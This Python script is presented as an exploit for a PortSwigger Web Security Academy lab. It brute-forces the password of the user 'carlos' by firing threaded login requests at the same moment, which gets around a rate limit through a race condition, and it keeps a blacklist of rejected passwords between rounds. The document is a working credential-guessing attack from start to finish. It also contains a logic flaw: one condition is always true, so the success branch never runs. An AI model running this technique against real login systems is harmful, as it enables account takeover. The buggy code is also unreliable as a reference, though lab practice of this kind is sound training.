"""
Exploit for lab:
    Bypassing rate limits via race conditions
    https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits

By Xqweak.
"""
import requests
import threading
import argparse
from bs4 import BeautifulSoup
from time import sleep
import random
from pprint import pprint
import warnings
import os
warnings.filterwarnings("ignore")


def attemp(url, password, csrf, session_cookie):
    data = {
            "username":"carlos",
            "password":password,
            "csrf":csrf
            }
    cookie = {"session":session_cookie}
    ans = requests.post(url, data, verify=False, cookies=cookie)
    long = len(str(ans.content))
    if(long == 3587):
        print(len(str(ans.content)))
        print(f'{password} pailas, banning...')
        with open('blacklist.txt','a') as fp:
            sleep(random.uniform(5,12))
            fp.write(f'{password}\n')
    elif(long > 3630 or 3640):
        print(len(str(ans.content)))
        print(f'{password} was banned, testing in the next attemp')
    else:
        print(len(str(ans.content)))
        print(f'{password} is the password! hacked!!!!')
        with open('hacked.txt','w') as fp:
            fp.write(password)

class RaceConditioner:
    def __init__(self, url):
        self.url = url
        with open('passwords.txt' , 'r') as fp:
            self.passwords = [i.replace('\n','') for i in fp.readlines()]

    def bypass_rateLimit(self):
        try:
            with open('blacklist.txt' , 'r') as fp:
                blacklist = [i.replace('\n','') for i in fp.readlines()]
                print('blacklist:')
                pprint(blacklist)
        except:
            blacklist = []
        login_url = f'{self.url}/login'
        s = requests.Session()
        s.verify = False
        c = s.get(login_url).content
        soup = BeautifulSoup(c, 'lxml')
        s_cookie = s.cookies['session']
        csrf_token = soup.find('input', {"name":"csrf"})['value']
        threads = [threading.Thread(target=attemp, args=(login_url , i, csrf_token, s_cookie)) for i in self.passwords if i not in blacklist]
        for i in threads:
            i.start()
        for i in threads:
            i.join()
        sleep(240)
        try:
            with open('hacked.txt' , 'r') as fp:
                password = fp.read()
                os.remove('blacklist.txt')
                print(f'the password is {password}')
        except:
            self.bypass_rateLimit()


lab = RaceConditioner("https://0a9a00cb03e86c3087f8c5d200ea0034.web-security-academy.net")
lab.bypass_rateLimit()
